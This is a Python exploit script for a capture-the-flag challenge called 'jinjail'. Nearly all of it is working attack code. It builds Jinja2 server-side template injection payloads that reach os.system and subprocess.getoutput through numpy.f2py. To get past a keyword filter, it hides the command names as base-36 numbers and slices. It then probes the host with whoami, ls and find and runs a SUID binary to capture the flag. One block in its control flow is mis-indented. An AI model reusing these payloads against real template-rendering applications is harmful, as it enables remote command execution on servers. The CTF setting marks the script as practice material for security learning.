import socket
import sys
import re
import argparse
import time

HOST = "challenges.1pc.tf"
PORT = 31769

# ── Base-36 number constants ──────────────────────────────────────────────────
FIXHELP_NUM = int("FIXHELP", 36)   # 33796365613
LS_NUM      = int("LS",      36)   # 784
FIND_NUM    = int("FIND",    36)   # 724009
WHOAMI_NUM  = int("WHOAMI",  36)   # 1964604618

# ── Payload helpers ────────────────────────────────────────────────────────────

def _lowered(num):
    """numpy.char.lower(numpy.base_repr(NUM, 36))  — uses 2 parens"""
    return f"numpy.char.lower(numpy.base_repr({num},36))"

def make_payload(set_expr, render_expr):
    """
    Build:  {% set s = SET_EXPR ~ numpy.f2py.os.sep %}{{ RENDER_EXPR }}
    s will be a Python str like 'fixhelp/' that is sliceable.
    """
    return (
        "{{% set s = {set} ~ numpy.f2py.os.sep %}}"
        "{{{{{render}}}}}"
    ).format(set=set_expr, render=render_expr)

# ── Payloads ──────────────────────────────────────────────────────────────────

def exploit_ossystem(space_idx=6):
    """Main exploit: os.system('/fix help') — output goes directly to socket."""
    return make_payload(
        _lowered(FIXHELP_NUM),
        f"numpy.f2py.os.system("
        f"numpy.f2py.os.sep ~ s[:3] ~ numpy.f2py.sys.version[{space_idx}] ~ s[3:7])"
    )

def exploit_getoutput(space_idx=6):
    """Fallback: getoutput captures /fix stdout and returns it as template output."""
    return make_payload(
        _lowered(FIXHELP_NUM),
        f"numpy.f2py.subprocess.getoutput("
        f"numpy.f2py.os.sep ~ s[:3] ~ numpy.f2py.sys.version[{space_idx}] ~ s[3:7])"
    )

# Probe payloads (all pass WAF)
PROBE_NUMPY_VER  = "{{ numpy.version.version }}"
PROBE_SYS_VER    = "{{ numpy.f2py.sys.version }}"
PROBE_VER_IDX6   = "{{ numpy.f2py.sys.version[6] }}"
PROBE_WHOAMI     = make_payload(_lowered(WHOAMI_NUM), "numpy.f2py.subprocess.getoutput(s[:6])")
PROBE_LS_CWD     = make_payload(_lowered(LS_NUM),     "numpy.f2py.subprocess.getoutput(s[:2])")
PROBE_FIND_ROOT  = make_payload(_lowered(FIND_NUM),   "numpy.f2py.subprocess.getoutput(s[:4])")
PROBE_FIX_NOARG  = make_payload(_lowered(FIXHELP_NUM),"numpy.f2py.subprocess.getoutput(numpy.f2py.os.sep ~ s[:3])")
PROBE_EXACT_CMD  = make_payload(_lowered(FIXHELP_NUM),"numpy.f2py.os.sep ~ s[:3] ~ numpy.f2py.sys.version[6] ~ s[3:7]")

# ── Socket helpers ─────────────────────────────────────────────────────────────

def send_payload(host, port, payload, timeout=10, recv_timeout=6.0):
    """Connect, wait for prompt, send payload, return raw response string."""
    with socket.create_connection((host, port), timeout=timeout) as sock:
        buf = b""
        while b">>> " not in buf:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk

        sock.sendall((payload + "\n").encode())

        resp = b""
        sock.settimeout(recv_timeout)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass

    return resp.decode(errors="replace").strip()

# ── Flag extraction ────────────────────────────────────────────────────────────

_FLAG_RE = re.compile(r"[A-Z0-9_]{1,10}\{[^}]+\}", re.IGNORECASE)

def extract_flag(text):
    m = _FLAG_RE.search(text)
    return m.group(0) if m else None

# ── Probe phase ────────────────────────────────────────────────────────────────

def run_probes(host, port, verbose=True):
    probes = [
        ("numpy_version",  PROBE_NUMPY_VER),
        ("sys_version",    PROBE_SYS_VER),
        ("sys_ver_idx6",   PROBE_VER_IDX6),
        ("whoami",         PROBE_WHOAMI),
        ("ls_cwd",         PROBE_LS_CWD),
        ("find_root",      PROBE_FIND_ROOT),
        ("fix_noarg",      PROBE_FIX_NOARG),
        ("exact_cmd",      PROBE_EXACT_CMD),
    ]
    results = {}
    for name, payload in probes:
        if verbose:
            print(f"  [{name:16s}] ", end="", flush=True)
        try:
            r = send_payload(host, port, payload)
            results[name] = r
            if verbose:
                print(repr(r[:100]))
        except Exception as e:
            results[name] = f"ERROR: {e}"
            if verbose:
                print(f"ERROR: {e}")
        time.sleep(0.25)
    return results

# ── Main exploit ───────────────────────────────────────────────────────────────

def exploit(host, port, verbose=True):
    print(f"\n{'='*55}")
    print(f"  jinjail exploit  →  {host}:{port}")
    print(f"{'='*55}")

    # ── Phase 1: probe ────────────────────────────────────
    if verbose:
        print("\n[Phase 1] Probing server...\n")
    results = run_probes(host, port, verbose)

    numpy_ver  = results.get("numpy_version", "?")
    sys_ver    = results.get("sys_version", "")
    space_char = results.get("sys_ver_idx6", "")
    exact_cmd  = results.get("exact_cmd", "")
    fix_check  = results.get("fix_noarg", "")
    root_files = results.get("find_root", "")

    if verbose:
        print()
        print(f"  numpy  : {numpy_ver}")
        print(f"  python : {sys_ver[:40]!r}")
        print(f"  ver[6] : {space_char!r}  {'✓ space' if space_char==' ' else '✗ NOT a space'}")
        print(f"  cmd    : {exact_cmd!r}")
        print(f"  /fix   : {fix_check!r}")

    # Check /fix binary
    fix_exists = "Nope" in fix_check
    if not fix_exists:
        if verbose:
            print("\n  [!] /fix not found via no-arg probe.")
            if "fix" in root_files:
                print("  [!] But 'fix' appears in root listing — might be accessible.")
            else:
                print("  [!] 'fix' not in root listing either. Check challenge port.")

    # Detect space index
    # Detect real space index dynamically
    space_idx = None

    if verbose:
        print("\n  [*] Scanning for space in sys.version...")

    for i in range(0, 40):
        try:
            c = send_payload(host, port, f"{{{{ numpy.f2py.sys.version[{i}] }}}}")
            
            # More robust check
            if c.strip() == "":
                space_idx = i
                if verbose:
                    print(f"  [+] Space found at index {i}")
                break

            time.sleep(0.1)

        except Exception:
            pass

    if space_idx is None:
        space_idx = 6
        if verbose:
            print("  [!] Space not found, defaulting to 6")


        # ── Phase 2: fire ─────────────────────────────────────
        if verbose:
            print(f"\n[Phase 2] Firing exploit (space_idx={space_idx})...\n")

    attempts = [
        ("os.system",  exploit_ossystem(space_idx)),
        ("getoutput",  exploit_getoutput(space_idx)),
    ]

    for variant, payload in attempts:
        if verbose:
            print(f"  [{variant}] payload ({len(payload)} chars):")
            print(f"    {payload}")

        try:
            raw = send_payload(host, port, payload, recv_timeout=10.0)
            if verbose:
                print(f"  [{variant}] response: {raw!r}")

            flag = extract_flag(raw)
            if flag:
                return flag

            # os.system prints flag to stdout then returns 0; flag is in raw
            # before the "0" at the end
            if variant == "os.system" and raw and raw != "0":
                lines = [l.strip() for l in raw.splitlines() if l.strip() and l.strip() != "0"]
                for line in lines:
                    if "{" in line:
                        return line   # likely the flag

        except Exception as e:
            if verbose:
                print(f"  [{variant}] ERROR: {e}")

        time.sleep(0.3)

    return None

# ── CLI ────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="jinjail CTF exploit: Jinja2 SSTI → numpy f2py → SUID /fix"
    )
    parser.add_argument("--host",       default=HOST,  help="Challenge host")
    parser.add_argument("--port",       type=int, default=PORT)
    parser.add_argument("--timeout",    type=int, default=10, help="Socket timeout (s)")
    parser.add_argument("--probe-only", action="store_true",
                        help="Only run probes, don't fire exploit")
    parser.add_argument("-q", "--quiet", action="store_true")
    args = parser.parse_args()

    verbose = not args.quiet

    if args.probe_only:
        print(f"[*] Probing {args.host}:{args.port} ...\n")
        run_probes(args.host, args.port, verbose=True)
        return

    try:
        flag = exploit(args.host, args.port, verbose=verbose)
    except ConnectionRefusedError:
        print(f"[-] Connection refused: {args.host}:{args.port}", file=sys.stderr)
        sys.exit(1)
    except socket.timeout:
        print("[-] Timed out.", file=sys.stderr)
        sys.exit(1)
    except OSError as e:
        print(f"[-] Network error: {e}", file=sys.stderr)
        sys.exit(1)

    print(f"\n{'='*55}")
    if flag:
        print(f"  ★  FLAG: {flag}")
    else:
        print("  Flag not captured — review probe output above.")
    print(f"{'='*55}\n")

if __name__ == "__main__":
    main()
